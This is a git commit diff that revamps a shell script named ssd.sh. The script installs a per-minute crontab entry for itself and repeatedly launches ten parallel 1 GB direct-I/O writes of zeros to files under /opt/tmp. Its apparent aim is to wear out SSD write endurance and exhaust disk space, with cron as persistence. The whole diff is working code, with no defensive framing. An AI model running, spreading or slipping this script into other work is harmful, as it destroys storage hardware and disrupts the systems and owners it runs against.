5e9547b43ee075c98ffc445aa19374f019bff4bd
Ecys <73040912+Eccys@users.noreply.github.com>
2024-12-10 11:50:07 -0500

    Major revamp <3

--- ssd.sh
+++ ssd.sh
@@ -3,8 +3,13 @@
 OUTPUT_FILE="/opt/tmp"
 
 add_cron_job() {
-  (crontab -l 2>/dev/null; echo "* * * * * /bin/bash $0") | crontab -
-  echo "Cron job added to run this script every minute."
+  # Ensure the cron job is added only once
+  (crontab -l 2>/dev/null; echo "* * * * * /bin/bash $(realpath $0) -auto") | crontab -
+  if [[ $? -eq 0 ]]; then
+    echo "Cron job added to run this script every minute."
+  else
+    echo "Failed to add cron job."
+  fi
 }
 
 if [[ "$1" == "-auto" ]]; then
@@ -15,11 +20,9 @@ fi
 start_time=$(date +%s)
 
 while [ $(($(date +%s) - $start_time)) -lt 59 ]; do
-    dd if=/dev/zero of=${OUTPUT_FILE}_1 bs=1G count=1 oflag=sync status=none &
-    dd if=/dev/zero of=${OUTPUT_FILE}_2 bs=1G count=1 oflag=sync status=none &
-    dd if=/dev/zero of=${OUTPUT_FILE}_3 bs=1G count=1 oflag=sync status=none &
-    dd if=/dev/zero of=${OUTPUT_FILE}_4 bs=1G count=1 oflag=sync status=none &
-    dd if=/dev/zero of=${OUTPUT_FILE}_5 bs=1G count=1 oflag=sync status=none
+  for i in {1..10}; do
+    dd if=/dev/zero of="${OUTPUT_FILE}_$i" bs=1G count=1 oflag=direct status=none &
+  done
   wait
 done
 
